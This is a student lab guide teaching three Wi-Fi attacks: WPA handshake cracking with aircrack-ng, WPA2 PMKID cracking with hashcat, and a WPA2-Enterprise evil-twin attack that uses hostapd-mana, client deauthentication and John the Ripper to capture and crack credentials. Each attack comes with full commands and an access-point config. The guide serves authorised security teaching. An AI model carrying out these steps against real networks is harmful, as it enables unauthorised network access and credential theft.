# Wireless Hacking Lab Guide

> **Authors:** Jonathan New Kah Hwee (2100296I) · Lam Yu Zhe (2100396G)
>
> ⚠️ **Disclaimer:** All techniques in this guide are for **educational purposes and authorised ethical hacking exercises only**. Do not use these techniques on networks you do not own or have explicit permission to test.

---

## Table of Contents

1. [Preamble](#preamble)
2. [WPA Hacking using Aircrack-ng Suite](#wpa-hacking-using-aircrack-ng-suite)
3. [WPA2 Hacking using hcxdumptool and Hashcat (PMKID)](#wpa2-hacking-using-hcxdumptool-and-hashcat-pmkid)
4. [WPA2 Enterprise Hacking using hostapd-mana and hostapd-wpe](#wpa2-enterprise-hacking-using-hostapd-mana-and-hostapd-wpe)

---

## Preamble

### Objectives

In this lab, participants will experience hands-on Red Teaming across three wireless attack scenarios.

### Requirements

**Applications:**
- VirtualBox

**Virtual Machines:**
- `Win7VM` — Major Project
- `KaliLinuxVM` — Major Project

**Tools:**
- Aircrack-ng network suite
- Airgeddon
- Wireshark
- Wordlists

### Log-In Details

| Machine             | Username              | Password    |
|---------------------|-----------------------|-------------|
| Kali Linux          | `kali`                | `toor`      |
| Windows 2019 Server | `Kudos\administrator` | `P@ssw0rd`  |

### Other Information

- **Domain server name:** `kudos.local`
- **Wordlist (hash cracking):** `rockyou.txt`

| Host                | IP Address    |
|---------------------|---------------|
| Network address     | `10.0.2.0/24` |
| Kali Linux          | `10.0.2.18`   |
| Windows 2019 Server | `10.0.2.15`   |
| Windows 10 (User 1) | `10.0.2.16`   |
| Windows 10 (User 2) | `10.0.2.17`   |

---

## WPA Hacking using Aircrack-ng Suite

**Introduction:** In this section, you will learn the basics of capturing a WPA handshake and performing a brute-force attack to crack a Wi-Fi password. Ensure you have a Kali Linux VM and a Wi-Fi card that supports packet injection.

**Objective:** Capture a WPA handshake, convert it into a hash, and execute a brute-force attack using a wordlist to retrieve the Wi-Fi password.

**Preparation:**
- Set up a Kali Linux virtual machine or boot into Kali Linux.
- Ensure your Wi-Fi card supports packet injection.
- Open a terminal window.

---

### Prerequisites

To prevent conflicts, disable processes using the wireless interface:

```bash
sudo airmon-ng check kill
```

> ⚠️ **Run `airmon-ng check kill` before using other Aircrack-ng tools** to ensure wireless interface compatibility for monitoring and manipulation.

Identify the interface name of your wireless adapter (`wlan0` / `wlan1`):

```bash
iwconfig
```

---

### Step 1: Capturing the Handshake

Put your wireless card into monitor mode. Replace `<interface>` with your wireless interface name (e.g., `wlan0`):

```bash
sudo airmon-ng start <interface>
```

> **Why must we set our wireless card into monitor mode?**  
> It enables the card to capture and analyse wireless network traffic without associating with any specific network.

Scan for available Wi-Fi networks and note the target network's BSSID (MAC address) and channel:

```bash
sudo airodump-ng <interface>
```

Capture the handshake. Replace `<channel>` with the channel number and `<BSSID>` with the MAC address of the target network:

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w handshake <interface>
```

| Option | Description |
|--------|-------------|
| `sudo` | Executes command as superuser |
| `airodump-ng` | CLI tool for capturing wireless network information |
| `-c <channel>` | Target the specific channel of the network |
| `--bssid <BSSID>` | Filter capture to the target network's BSSID |
| `-w handshake` | Prefix for output files (saves captured handshake data) |
| `<interface>` | Wireless interface in monitor mode (e.g., `wlan0`, `mon0`) |

---

### Step 2: Obtaining the Hash

Open a new terminal. Convert the captured handshake to a hash file. Replace `<BSSID>` with the MAC address of the target network:

```bash
sudo aircrack-ng -J hash -b <BSSID> handshake*.cap
```

| Option | Description |
|--------|-------------|
| `sudo` | Executes command as superuser |
| `aircrack-ng` | Tool suite for wireless security tasks and WPA/WPA2-PSK cracking |
| `-J hash` | Specifies the output file name (`hash.hccap`) for the recovered key |
| `-b <BSSID>` | BSSID of the target network |
| `handshake*.cap` | Wildcard pattern to match captured handshake files |

The hash file (`hash.hccap`) will be saved in the current directory.

> **Note:** Converting the handshake to a hash file is required before performing the brute-force attack.

---

### Step 3: Brute-Forcing the Passphrase

Navigate to the wordlists directory:

```bash
cd /usr/share/wordlists
```

Decompress the `rockyou.txt` wordlist:

```bash
sudo gunzip -d rockyou.txt.gz
```

| Option | Description |
|--------|-------------|
| `gunzip` | Decompresses Gzip files |
| `-d` | Flag for decompression |
| `rockyou.txt.gz` | The compressed wordlist file |

Perform the brute-force attack. Replace `<wordlist>` with the path to your wordlist and `<BSSID>` with the target's MAC address:

```bash
sudo aircrack-ng -w <wordlist> -b <BSSID> handshake*.cap
```

- Wordlists are located at `/usr/share/wordlists/`
- In this lab, use `/home/Kali/rockyou.txt`

Wait for the attack to complete. If the passphrase is found, it will be displayed in the terminal.

> **Note:** The brute-force attack systematically tries different passwords from the wordlist until the correct one is found.

---

## WPA2 Hacking using hcxdumptool and Hashcat (PMKID)

**Objective:** Capture a PMKID hash from a WPA2 network and crack the password using Hashcat.

**Introduction:** The PMKID attack does not require a full WPA2 handshake — instead it captures a single PMKID frame from the access point.

---

### Step 1: Install hcxdumptool

Install `hcxdumptool` and `hcxtools` if not already present:

```bash
sudo apt install hcxdumptool
sudo apt install hcxtools
```

---

### Step 2: Scan for Target Network

Kill interfering processes and scan for surrounding networks:

```bash
sudo airmon-ng check kill
sudo airodump-ng wlan0
```

Note the BSSID of your target network. Lock into it with:

```bash
sudo airodump-ng wlan0 -d <target BSSID>
```

---

### Step 3: Capture PMKID

Put your interface into monitor mode:

```bash
sudo airmon-ng start wlan0
```

Start `hcxdumptool` to capture the PMKID. Replace `<BSSID>` with the target's MAC address (removing colons):

```bash
sudo hcxdumptool -i wlan0 --enable_status=3 -o hcxdump.pcapng --filtermode=2 --filterlist=<BSSID>
```

| Option | Description |
|--------|-------------|
| `-i wlan0` | Interface used for capturing |
| `--enable_status=3` | Display all status messages |
| `-o hcxdump.pcapng` | Output file for captured data |
| `--filtermode=2` | Filter to capture only the specified access point |
| `--filterlist=<BSSID>` | BSSID of the target (no colons) |

---

### Step 4: Convert Captured File

Once you've captured a PMKID, stop `hcxdumptool` (Ctrl+C) and convert the output:

```bash
hcxpcapngtool -o hash.hc22000 -E essidlist hcxdump.pcapng
```

| Option | Description |
|--------|-------------|
| `-o hash.hc22000` | Output file in Hashcat format 22000 |
| `-E essidlist` | Writes found ESSIDs to a file |
| `hcxdump.pcapng` | Input file from hcxdumptool |

Find the ESSID and BSSID of your target network in the output.

---

### Step 5: Identify the Target Hash

Open `hash.hc22000` in a text editor and find the hash line associated with your target network's MAC address (use Ctrl+F). Copy that line and paste it into a new file:

```bash
nano target.hc22000
# Paste the specific hash line, then save
```

---

### Step 6: Crack with Hashcat

Use Hashcat to perform a dictionary attack:

```bash
hashcat -m 22000 hash.hc22000 /home/Kali/rockyou.txt --show
```

| Option | Description |
|--------|-------------|
| `-m 22000` | Specifies hash type (WPA2 PMKID/EAPOL, `.hc22000` format) |
| `hash.hc22000` | The hash file to crack |
| `/home/Kali/rockyou.txt` | Dictionary wordlist |
| `--show` | Display cracked results if already in potfile |

---

## WPA2 Enterprise Hacking using hostapd-mana and hostapd-wpe

**Objective:** Set up a fake access point and capture WPA2 Enterprise credentials using `hostapd-mana` and `hostapd-wpe`.

**Prerequisites:**
- Basic understanding of Linux CLI
- Familiarity with Wi-Fi networks and security concepts
- 2 Wi-Fi adapters (`wlan0` and `wlan1`)

---

### Step 1: Install hostapd-mana

```bash
sudo apt install hostapd-mana
sudo apt install hostapd-wpe
```

View and configure `hostapd-mana`'s config file:

```bash
cd /etc/hostapd-mana
sudo vim hostapd-mana.conf
```

View and configure `hostapd-wpe`'s config file:

```bash
cd /etc/hostapd-wpe
sudo vim hostapd-wpe.conf
```

---

### Step 2: Scan Networks and Select Target

Kill interfering processes and scan:

```bash
sudo airmon-ng check kill
sudo airodump-ng wlan0
```

Lock into the target network by BSSID:

```bash
sudo airodump-ng wlan0 -d <target network BSSID>
```

Or lock in by channel:

```bash
sudo airodump-ng --channel <channel number> wlan0
```

After locking in, note the **Channel (CH)**, **ESSID**, and any **Stations** (connected clients).

> **Note:** Configure your fake AP to closely match the real network (same SSID, channel) so victims cannot easily distinguish between them.
>
> **During this lab:** Note down your **own mobile device's MAC address**. Only deauthenticate your own device.
>
> Connect your mobile device to the lab target network:
> - **Identity:** `bwallis`
> - **Password:** `P@ssw0rd`
> - Under certificates, select *Do not validate* and disable auto-reconnect.

---

### Step 3: Configure Fake Access Point

Create a new config file:

```bash
cd /etc/hostapd-mana
sudo vim AccessPoint.conf
```

Add the following configuration (adjust values to match your target network):

```
interface=wlan1
ssid=EvilTwin
channel=5
hw_mode=g
wpa_pairwise=TKIP CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
mana_wpe=1
mana_eapsuccess=1
```

| Parameter | Description |
|-----------|-------------|
| `interface=wlan1` | Interface for broadcasting fake network (wlan1, since wlan0 is used for monitoring) |
| `ssid=EvilTwin` | Name of the fake network |
| `channel=5` | Channel — try to match the real network |
| `hw_mode=g` | 802.11g standard (2.4 GHz) |
| `wpa_pairwise=TKIP CCMP` | Encryption algorithms used by WPA2/WPA2E |
| `ieee8021x=1` | Enables 802.1x authentication (WPA2 Enterprise) |
| Certs and keys | Obtained from `hostapd-wpe.conf` — needed to host the access point |
| `mana_wpe=1` | Enables WPE mode to intercept EAP credentials |
| `mana_eapsuccess=1` | Enables EAP success messages |

---

### Step 4: Start Fake Access Point

Save and exit the file (in vim):

```
:wq
```

Start the fake access point:

```bash
sudo hostapd-mana AccessPoint.conf
```

You should see the fake network appear in the Wi-Fi list on nearby devices.

---

### Step 5: Deauthenticate the Client

To force the client to connect to the fake AP, run a deauthentication attack.

First, stop `airodump-ng`, then set `wlan0` to the correct channel:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set channel <channel of target network>
sudo ip link set wlan0 up
```

Run the deauthentication attack:

```bash
aireplay-ng --deauth 5 -a <target network BSSID> -c <client device BSSID> wlan0 --ignore-negative-one
```

| Option | Description |
|--------|-------------|
| `--deauth 5` | Send 5 deauthentication packets to disconnect the client |
| `-a <BSSID>` | Target network/access point's BSSID |
| `-c <BSSID>` | Target client's BSSID |
| `wlan0` | Interface used for the deauth attack |
| `--ignore-negative-one` | Suppresses channel-mismatch error messages |

---

### Step 6: Obtain and Crack the Credentials

Once the client is deauthenticated, they will likely connect to the fake network (due to stronger signal). The encrypted credentials will be captured in the `hostapd-mana` terminal.

> **Troubleshooting:** If credentials don't appear, the adapter may be buggy. Unplug `wlan1`, stop the process, replug, and relaunch the access point.

Copy the `EAP-MSCHAPV2` JTR hash value (from the username onwards, excluding trailing colons) into a file:

```bash
nano hash.txt
# Paste the EAP-MSCHAPV2 hash line
```

Use John the Ripper to crack the password with a dictionary attack:

```bash
john --format=netntlm -w:/home/Kali/rockyou.txt hash.txt
```

| Option | Description |
|--------|-------------|
| `john` | Invokes John the Ripper password cracking tool |
| `--format=netntlm` | Specifies the hash/encryption algorithm |
| `-w` | Path to the wordlist |
| `hash.txt` | File containing the captured credentials |

The cracked password will be displayed in the terminal.

---

## Conclusion

In this lab, you covered three wireless attack techniques:

| Attack | Tools Used | Target |
|--------|-----------|--------|
| WPA Handshake Capture + Brute-Force | Aircrack-ng, rockyou.txt | WPA networks |
| PMKID Capture + Dictionary Attack | hcxdumptool, hcxtools, Hashcat | WPA2 networks |
| Evil Twin + EAP Credential Capture | hostapd-mana, hostapd-wpe, John the Ripper | WPA2 Enterprise networks |

> These techniques should **only** be used for educational purposes and ethical hacking exercises with proper authorisation.
